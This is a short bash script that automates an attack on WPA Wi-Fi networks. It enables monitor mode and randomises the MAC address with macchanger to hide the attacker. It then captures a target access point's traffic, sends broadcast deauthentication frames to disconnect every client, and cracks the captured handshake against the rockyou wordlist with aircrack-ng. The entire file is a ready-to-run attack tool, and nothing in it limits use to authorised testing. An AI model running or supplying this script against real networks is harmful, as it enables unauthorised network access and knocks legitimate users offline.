#!/bin/bash

#Author: Albicaty

#Colours
greenColour="\e[0;32m\033[1m"
endColour="\033[0m\e[0m"
redColour="\e[0;31m\033[1m"
blueColour="\e[0;34m\033[1m"
yellowColour="\e[0;33m\033[1m"
purpleColour="\e[0;35m\033[1m"
turquoiseColour="\e[0;36m\033[1m"
grayColour="\e[0;37m\033[1m"

trap ctrl_c INT

function ctrl_c(){
	echo -e "\nQuitting..."
	airmon-ng stop wlan0mon > /dev/null 2>&1
	rm hack1* 2>/dev/null 
	systemctl restart NetworkManager
	exit 0
}

function StartAttack(){
	clear
	echo -e "${greenColour}Setting network card...${endCOlour}"
	airmon-ng check kill >/dev/null 2>&1
	airmon-ng start wlan0 >/dev/null 2>&1
	ifconfig wlan0mon down && macchanger -a wlan0mon >/dev/null 2>&1
	ifconfig wlan0mon up && echo -e "${greenColour}New temporal MAC [${blueColour} $(macchanger -s wlan0mon | grep -i current | xargs | cut -d ' ' -f '3-50')${endColour} ${greenColour}]${endColour}"
	sleep 5
	xterm -hold -e "airodump-ng wlan0mon" &
	airodump1_PID=$!
	echo -ne "Access point name: " && read apName
	echo -ne "Access point channel: " && read apChannel; sleep 2
	kill -9 $airodump1_PID; wait $airodump1_PID 2>/dev/null
	xterm -hold -e "airodump-ng -w hack1 -c $apChannel --essid $apName wlan0mon" &
	airodump2_PID=$!
	sleep 5
	aireplay-ng --deauth 5 -e $apName -c FF:FF:FF:FF:FF:FF wlan0mon
	sleep 3; kill -9 $airodump2_PID; clear
	aircrack-ng hack1-01.cap -w /root/Wifi/wparockyou.txt
}

#Main function

if [ "$(id -u)" == "0" ]; then

	clear; echo -e "\n${yellowColour}[*]${endColour} For this program you need aircrack-ng packet, xterm, wlan0 interface and wparockyou wordlist"
	sleep 5

	StartAttack
	airmon-ng stop wlan0mon >/dev/null; rm hack1*
	systemctl restart NetworkManager
else
	echo -e "\n${redColour}[!] You must be root${endColour}"
fi
